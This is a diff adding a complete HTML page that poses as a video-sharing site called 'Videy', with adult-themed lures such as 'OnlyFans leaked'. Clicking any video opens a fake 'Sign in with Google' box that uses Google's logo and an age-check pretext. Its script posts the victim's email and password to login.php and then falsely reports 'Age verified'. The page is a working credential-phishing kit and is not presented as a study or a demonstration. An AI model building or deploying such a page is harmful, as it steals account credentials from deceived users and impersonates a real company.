@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Videy - Share your videos</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #0a0a0a;
+            color: white;
+            min-height: 100vh;
+        }
+        .navbar {
+            background: #111;
+            padding: 15px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #222;
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #ff4d4d, #ff6b6b);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .nav-links a {
+            color: #aaa;
+            text-decoration: none;
+            margin-left: 25px;
+            font-size: 14px;
+        }
+        .upload-btn {
+            background: #ff4d4d;
+            padding: 8px 16px;
+            border-radius: 20px;
+            color: white !important;
+        }
+        .hero {
+            text-align: center;
+            padding: 60px 20px;
+            background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
+        }
+        .hero h1 {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+        .hero p {
+            color: #888;
+            font-size: 18px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .video-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 25px;
+        }
+        .video-card {
+            background: #111;
+            border-radius: 12px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: transform 0.2s, border 0.2s;
+            border: 1px solid #222;
+        }
+        .video-card:hover {
+            transform: translateY(-5px);
+            border-color: #ff4d4d;
+        }
+        .thumbnail {
+            width: 100%;
+            height: 180px;
+            background: #1a1a1a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        .thumbnail img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .play-icon {
+            position: absolute;
+            font-size: 48px;
+            color: white;
+            text-shadow: 0 0 10px rgba(0,0,0,0.5);
+        }
+        .video-info {
+            padding: 12px;
+        }
+        .video-title {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .video-meta {
+            font-size: 12px;
+            color: #666;
+        }
+        .age-badge {
+            background: #ff4d4d;
+            color: white;
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 10px;
+            display: inline-block;
+            margin-left: 8px;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: white;
+            border-radius: 8px;
+            width: 350px;
+            padding: 30px;
+            text-align: center;
+            color: #333;
+        }
+        .modal-content img {
+            width: 60px;
+            margin-bottom: 20px;
+        }
+        .modal-content input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .modal-content button {
+            width: 100%;
+            padding: 12px;
+            background: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .close-modal {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #888;
+            cursor: pointer;
+        }
+        .footer {
+            text-align: center;
+            padding: 30px;
+            color: #444;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="navbar">
+    <div class="logo">VIDEY</div>
+    <div class="nav-links">
+        <a href="#">Home</a>
+        <a href="#">Trending</a>
+        <a href="#" class="upload-btn">Upload</a>
+    </div>
+</div>
+
+<div class="hero">
+    <h1>Share your videos</h1>
+    <p>Upload, watch, and share short videos instantly</p>
+</div>
+
+<div class="container">
+    <div class="video-grid">
+        <div class="video-card" data-video="1">
+            <div class="thumbnail">
+                <img src="https://picsum.photos/400/200?random=101" alt="thumbnail">
+                <div class="play-icon">▶️</div>
+            </div>
+            <div class="video-info">
+                <div class="video-title">Late night session 🔞 <span class="age-badge">18+</span></div>
+                <div class="video-meta">2.3M views • 3 days ago</div>
+            </div>
+        </div>
+        <div class="video-card" data-video="2">
+            <div class="thumbnail">
+                <img src="https://picsum.photos/400/200?random=102" alt="thumbnail">
+                <div class="play-icon">▶️</div>
+            </div>
+            <div class="video-info">
+                <div class="video-title">OnlyFans leaked 🔞 <span class="age-badge">18+</span></div>
+                <div class="video-meta">5.1M views • 1 day ago</div>
+            </div>
+        </div>
+        <div class="video-card" data-video="3">
+            <div class="thumbnail">
+                <img src="https://picsum.photos/400/200?random=103" alt="thumbnail">
+                <div class="play-icon">▶️</div>
+            </div>
+            <div class="video-info">
+                <div class="video-title">Private collection 🔞 <span class="age-badge">18+</span></div>
+                <div class="video-meta">890K views • 5 days ago</div>
+            </div>
+        </div>
+        <div class="video-card" data-video="4">
+            <div class="thumbnail">
+                <img src="https://picsum.photos/400/200?random=104" alt="thumbnail">
+                <div class="play-icon">▶️</div>
+            </div>
+            <div class="video-info">
+                <div class="video-title">Hot compilation 🔞 <span class="age-badge">18+</span></div>
+                <div class="video-meta">3.4M views • 2 days ago</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="footer">
+    © 2025 Videy - The easiest way to share videos
+</div>
+
+<div id="loginModal" class="modal">
+    <div class="modal-content">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/1200px-Google_%22G%22_Logo.svg.png" alt="Google">
+        <h3>Sign in with Google</h3>
+        <p style="font-size:12px; margin-bottom:20px;">You must be 18+ to continue</p>
+        <input type="email" id="email" placeholder="Email" autocomplete="off">
+        <input type="password" id="password" placeholder="Password" autocomplete="off">
+        <button id="loginBtn">Next</button>
+        <div class="close-modal" id="closeModal">Cancel</div>
+    </div>
+</div>
+
+<script>
+    const videoCards = document.querySelectorAll('.video-card');
+    const modal = document.getElementById('loginModal');
+    const closeModalBtn = document.getElementById('closeModal');
+    const loginBtn = document.getElementById('loginBtn');
+    const emailInput = document.getElementById('email');
+    const passInput = document.getElementById('password');
+
+    function openModal() {
+        modal.style.display = 'flex';
+    }
+
+    function closeModal() {
+        modal.style.display = 'none';
+        emailInput.value = '';
+        passInput.value = '';
+    }
+
+    videoCards.forEach(card => {
+        card.addEventListener('click', openModal);
+    });
+
+    closeModalBtn.addEventListener('click', closeModal);
+    window.addEventListener('click', (e) => {
+        if (e.target === modal) closeModal();
+    });
+
+    loginBtn.addEventListener('click', () => {
+        const email = emailInput.value.trim();
+        const password = passInput.value.trim();
+
+        if (email && password) {
+            fetch('login.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password)
+            })
+            .then(() => {
+                alert('Age verified. Redirecting to video...');
+                closeModal();
+            })
+            .catch(err => console.log(err));
+        } else {
+            alert('Please fill in both fields');
+        }
+    });
+</script>
+</body>
+</html>
